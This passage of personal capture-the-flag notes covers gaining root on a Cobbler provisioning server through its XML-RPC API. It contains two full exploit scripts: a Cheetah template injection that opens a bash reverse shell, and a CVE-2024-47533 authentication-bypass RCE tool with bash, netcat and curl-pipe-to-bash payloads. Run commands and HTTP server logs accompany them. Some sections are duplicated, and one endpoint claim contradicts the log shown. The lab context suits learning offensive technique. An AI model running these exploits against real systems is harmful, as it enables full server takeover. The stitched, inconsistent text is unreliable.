<name>arch</name>
<value><string>x86_64</string></value>
</member>
<member>
<name>boot_loaders</name>
<value><string>&lt;&lt;inherit&gt;&gt;</string></value>
</member>
<member>
<name>breed</name>
<value><string>redhat</string></value>
</member>
<member>
<name>initrd</name>
<value><string>/boot/initrd.img-6.1.0-37-amd64</string></value>
</member>
<member>
<name>kernel</name>
<value><string>/boot/vmlinuz-6.1.0-37-amd64</string></value>
</member>
<member>
<name>os_version</name>
<value><string></string></value>
</member>
<member>
<name>redhat_management_key</name>
<value><string>&lt;&lt;inherit&gt;&gt;</string></value>
</member>
<member>
<name>source_repos</name>
<value><array><data>
</data></array></value>
</member>
<member>
<name>remote_boot_kernel</name>
<value><string></string></value>
</member>
<member>
<name>remote_boot_initrd</name>
<value><string></string></value>
</member>
</struct></value>
</data></array></value>
</param>
</params>
</methodResponse>

```
- Finally I can run an exploit on the forwarded port to return a reverse shell on the port I want. The exploit goes after generate_autoinstall_template where cheetah executes our code as it runs python and doesnt sanitize it well.
- Exploit.py
```
cat exploit.py                                                                      
# exploit.py - run this from YOUR Kali machine
import xmlrpc.client

LHOST = "10.10.16.126"
LPORT = "9001"

payload = f"""#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"')
lang en_US
keyboard us
rootpw --plaintext cobbler
timezone UTC
bootloader --location=mbr
clearpart --all --initlabel
autopart
reboot
"""

s = xmlrpc.client.ServerProxy("http://127.0.0.1:25151")
t = s.login("cobbler", "cobbler")
print("Token:", t)

s.write_autoinstall_template("pwn.ks", payload, t)

did = s.new_distro(t)
s.modify_distro(did, "name", "pwndistro", t)
s.modify_distro(did, "arch", "x86_64", t)
s.modify_distro(did, "breed", "redhat", t)
s.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-37-amd64", t)
s.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-37-amd64", t)
s.save_distro(did, t)

pid = s.new_profile(t)
s.modify_profile(pid, "name", "pwnprofile", t)
s.modify_profile(pid, "distro", "pwndistro", t)
s.modify_profile(pid, "autoinstall", "pwn.ks", t)
s.save_profile(pid, t)

print("Triggering RCE...")
try:
    print(s.generate_profile_autoinstall("pwnprofile"))
except Exception as e:
    print("Exception:", e)
```

- I run the code with a netcat listener on port 9001 to get a reverse shell
```
python3 exploit.py
```
![[Pasted image 20260505104316.png]]

![[Pasted image 20260505104302.png]]

- I get the root flag:
![[Pasted image 20260505104338.png]]

- (probably intended) Another vulnerability for code execution is in the background_imports function:
https://github.com/cobbler/cobbler/issues/1329
- Using this we can also get a reverse shell exploiting this function. it is much easier and doesnt require building a template. A public exploit is availabnle which exploits this:
https://github.com/zs1n/CVE-2024-47533/blob/main/CVE-2024-47533.py
or
https://github.com/dollarboysushil/CVE-2024-47533-Cobbler-XMLRPC-Authentication-Bypass-RCE-Exploit-POC/blob/main/CVE-2024-47533-dbs.py

- code:
```
#!/usr/bin/env python3
import ssl
import xmlrpc.client
import argparse

def exploit(target, lhost, lport, payload_type):
    payloads = {
        "bash": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
        "nc": f"nc -e /bin/bash {lhost} {lport}",
        "curl": f"curl http://{lhost}/rev.sh | bash"
    }

    payload = payloads.get(payload_type, payloads)

    print(f"[*] Target: {target}")
    print(f"[*] Listener: {lhost}:{lport}")
    print(f"[*] Payload type: {payload_type}")

    try:
        conn = xmlrpc.client.ServerProxy(
            target,
            context=ssl._create_unverified_context(),
            allow_none=True
        )

        print("[*] Trying to authenticate...")
        try:
            token = conn.login("", -1)
            print("[+] Login success!")
        except:
            token = None
            print("[-] Login bypass (anonymous)")

        import_data = {
            "path": "~/tmp",
            "name": f"$({payload})"
        }

        print("[*] Sending exploit...")
        if token:
            result = conn.background_import(import_data, token)
        else:
            result = conn.background_import(import_data)

        print("[+] Exploit sent. Check your listener (nc -lvnp PORT)")
        return True

    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-47533 - Cobbler RCE")
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., https://127.0.0.1:25151/cobbler_api)')
    parser.add_argument('-l', '--lhost', required=True, help='Your IP for reverse shell')
    parser.add_argument('-p', '--lport', required=True, type=int, help='Your port for reverse shell')
    parser.add_argument('--payload', choices=['bash', 'nc', 'curl'], help='Payload type')

    args = parser.parse_args()
    exploit(args.target, args.lhost, args.lport, args.payload)


if __name__ == "__main__":
    main()
```
- I pass the command:
```
python3 exploit2.py -t http://127.0.0.1:25151 -l 10.10.16.126 -p 9001 --payload bash
```

![[Pasted image 20260506143143.png]]

----
### Added/Extra Notes


- The true path is not to use cobbler:cobbler but the null authentication base don this change we see in the github link:
https://github.com/cobbler/cobbler/commit/263ea241c8479ba3f326cea376a503a8219427a4

- just a quick google search wtih google ai shows:
```
Cobbler API What is it What are templates
The Cobbler API is a set of tools and protocols that allow for the management and interaction with Cobbler systems. Templates in Cobbler refer to the files that Cobbler uses to generate the final configuration for a system during PXE boot. These templates can be customized with variables and snippets to create a unique configuration for each system or profile. Cobbler supports both Cheetah and Jinja2 templates, providing flexibility and advanced features for configuration generation
```

- so knowing we can authenticate with nothing and it is used for PXE boot we can generate a template with the system we want and boot it up.


- Another google search to isntall tempalte even gives code:
```
Got it — you’re asking about using the Cobbler API to install (or deploy) a system from a template.
Cobbler is a Linux provisioning server that can manage installation profiles, system definitions, and templates for automated deployments.

Here’s the key idea:

In Cobbler, a template is usually a kickstart or preseed file with variables that get filled in from system or profile data.
The API lets you create or update these templates, associate them with profiles, and trigger an installation.
Typical API Workflow for Installing from a Template

Upload or Update the Template
Use the API to add your kickstart/preseed template to Cobbler’s configuration:

Python

Copy code
import xmlrpc.client

server = xmlrpc.client.Server("http://cobbler.example.com/cobbler_api")
token = server.login("admin", "yourpassword")

# Example: update a kickstart template file
server.template_update("my_template.ks", "/var/lib/cobbler/templates/my_template.ks", token)
Create a Profile Using the Template
Profiles link a distribution to a kickstart template:

Python

Copy code
profile_id = server.new_profile(token)
server.modify_profile(profile_id, "name", "centos7-template", token)
server.modify_profile(profile_id, "kickstart", "/var/lib/cobbler/templates/my_template.ks", token)
server.modify_profile(profile_id, "distro", "centos7-x86_64", token)
server.save_profile(profile_id, token)
Create a System and Assign the Profile

Python

Copy code
system_id = server.new_system(token)
server.modify_system(system_id, "name", "webserver01", token)
server.modify_system(system_id, "profile", "centos7-template", token)
server.modify_system(system_id, "hostname", "webserver01.example.com", token)
server.save_system(system_id, token)
Trigger Installation
Once PXE booted or via koan on the target machine, Cobbler will use the assigned template to install.

Note:

Cobbler doesn’t “push” installs directly; it prepares the PXE/kickstart environment, and the target boots into it.
If you want to re-read a modified template without restarting Cobbler, newer versions have an API endpoint for that (template_reload or similar).
If you’d like, I can prepare a ready-to-run Python script that connects to Cobbler’s API, uploads a template, and provisions a system in one go.
Do you want me to make that for you?
```

- Regarding cobbler auto isntall:
```
Cobbler API Auto Install
The Cobbler API supports various auto-installation methods, including AutoYaST, Kickstart, Preseed, and Cloud-Init. These methods allow for automated installations of SUSE and openSUSE systems, as well as Debian and Ubuntu systems. Cobbler provides a built-in script called "Anamon" for sending client-side installation logs back to the Cobbler server. The API also supports templating for advanced functions, allowing for the customization of automatic installation files. For more detailed information, users can refer to the Cobbler documentation and GitHub issues page.
- In a few minutes we will see both the download and the response:
- Download:
![[Pasted image 20260505092426.png]]
- Response:
![[Pasted image 20260505092443.png]]
```

```
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?page=http%3A%2F%2Fcobblestone.htb%2Fskins.php HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?ep=preview_banner.php&status=500 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?ep=preview.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?ep=preview_skin.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=admin.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=banner.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=upload.php&status=400 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=upload.php&status=400 HTTP/1.1" 200 -
```

- As we can see the `preview_skin.php` responded with 500 instead of 404 pointing to the target endpoint we need.```
- For us we use kd kickstart for it







----
## Checking preview_banner.php endpoint is valid 
- In a few minutes we will see both the download and the response:
- Download:
![[Pasted image 20260505092426.png]]
- Response:
![[Pasted image 20260505092443.png]]
```
python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?page=http%3A%2F%2Fcobblestone.htb%2Fskins.php HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?ep=preview_banner.php&status=500 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?ep=preview.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:07] "GET /?ep=preview_skin.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=admin.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=banner.php&status=404 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=upload.php&status=400 HTTP/1.1" 200 -
10.129.232.170 - - [05/May/2026 09:14:08] "GET /?ep=upload.php&status=400 HTTP/1.1" 200 -
```

- As we can see the `preview_skin.php` responded with 500 instead of 404 pointing to the target endpoint we need.